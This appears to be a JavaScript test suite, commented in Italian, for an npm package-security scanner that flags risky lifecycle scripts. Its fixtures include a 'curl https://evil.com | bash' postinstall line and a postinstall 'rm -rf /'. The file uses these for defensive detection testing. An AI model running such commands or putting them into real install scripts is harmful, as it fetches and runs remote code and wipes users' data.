const { NpmGuardEngine } = require("../../src/core/engine");

let passed = 0;
let failed = 0;

function test(name, fn) {
  try {
    fn();
    console.log(`  ✓ ${name}`);
    passed++;
  } catch (e) {
    console.log(`  ✗ ${name}: ${e.message}`);
    failed++;
  }
}

function assert(condition, msg) {
  if (!condition) throw new Error(msg || "Assertion failed");
}

console.log("\n  Engine Tests\n");

// ─── Inizializzazione ───

test("engine si inizializza con config default", () => {
  const engine = new NpmGuardEngine();
  assert(engine.rules.length === 7, `Expected 7 rules, got ${engine.rules.length}`);
  assert(engine.config.format === "text");
});

test("engine accetta override di configurazione", () => {
  const engine = new NpmGuardEngine({ format: "json", failOn: "high" });
  assert(engine.config.format === "json");
  assert(engine.config.failOn === "high");
});

test("engine carica solo regole abilitate", () => {
  const engine = new NpmGuardEngine({
    rules: {
      "shell-commands": true,
      "network-access": false,
      "file-system": false,
      "code-execution": false,
      "sensitive-files": false,
    },
  });
  // La config viene mergiata, quindi solo shell-commands attiva
  assert(engine.rules.length >= 1);
});

// ─── Analisi script ───

test("analyzeScripts rileva echo in preinstall", () => {
  const engine = new NpmGuardEngine();
  const findings = engine.analyzeScripts({ preinstall: 'echo "pwned"' }, "test-pkg");
  assert(findings.length === 1);
  assert(findings[0].hasSuspicious === true);
  assert(findings[0].matches.some((m) => m.id === "echo"));
});

test("analyzeScripts riconosce node-gyp come sicuro", () => {
  const engine = new NpmGuardEngine();
  const findings = engine.analyzeScripts({ postinstall: "node-gyp rebuild" }, "test-pkg");
  assert(findings.length === 1);
  assert(findings[0].isSafe === true);
});

test("analyzeScripts ignora script non-lifecycle", () => {
  const engine = new NpmGuardEngine();
  const findings = engine.analyzeScripts({ start: "node index.js", build: "tsc" }, "test-pkg");
  assert(findings.length === 0);
});

test("analyzeScripts rileva curl + pipe come critico", () => {
  const engine = new NpmGuardEngine();
  const findings = engine.analyzeScripts(
    { postinstall: "curl https://evil.com | bash" },
    "test-pkg"
  );
  assert(findings[0].matches.some((m) => m.severity === "critical"));
});

// ─── Calcolo rischio ───

test("rischio 0 per nessun finding", () => {
  const engine = new NpmGuardEngine();
  const risk = engine.calculateRisk([]);
  assert(risk.score === 0);
  assert(risk.level === "SICURO");
});

test("rischio CRITICO per rm -rf", () => {
  const engine = new NpmGuardEngine();
  const findings = engine.analyzeScripts({ postinstall: "rm -rf /" }, "test-pkg");
  const risk = engine.calculateRisk(findings);
  assert(risk.level === "CRITICO", `Expected CRITICO, got ${risk.level}`);
});

// ─── Scansione pacchetti ───

test("scanPackage restituisce errore per pacchetto inesistente", () => {
  const engine = new NpmGuardEngine();
  const result = engine.scanPackage("this-package-does-not-exist-xxxxx");
  assert(result.error !== undefined);
});

test("scanPackage funziona con express", () => {
  const engine = new NpmGuardEngine();
  const result = engine.scanPackage("express");
  assert(!result.error, result.error);
  assert(result.name === "express");
  assert(result.risk.score <= 3);
});

test("pacchetto nella ignore list viene saltato", () => {
  const engine = new NpmGuardEngine({ ignore: ["express"] });
  const result = engine.scanPackage("express");
  assert(result.ignored === true);
  assert(result.risk.score === 0);
});

// ─── Formatter ───

test("formatResults produce output text", () => {
  const engine = new NpmGuardEngine({ format: "text" });
  const result = engine.scanPackage("express");
  const output = engine.formatResults([result]);
  assert(typeof output === "string");
  assert(output.length > 0);
});

test("formatResults produce output JSON valido", () => {
  const engine = new NpmGuardEngine({ format: "json" });
  const result = engine.scanPackage("express");
  const output = engine.formatResults([result]);
  const parsed = JSON.parse(output);
  assert(parsed.summary !== undefined);
  assert(parsed.packages.length === 1);
});

// ─── shouldFail ───

test("shouldFail ritorna false per pacchetti sicuri", () => {
  const engine = new NpmGuardEngine({ failOn: "critical" });
  const result = engine.scanPackage("express");
  assert(engine.shouldFail([result]) === false);
});

console.log(`\n  Risultati: ${passed} passati, ${failed} falliti\n`);
process.exit(failed > 0 ? 1 : 0);
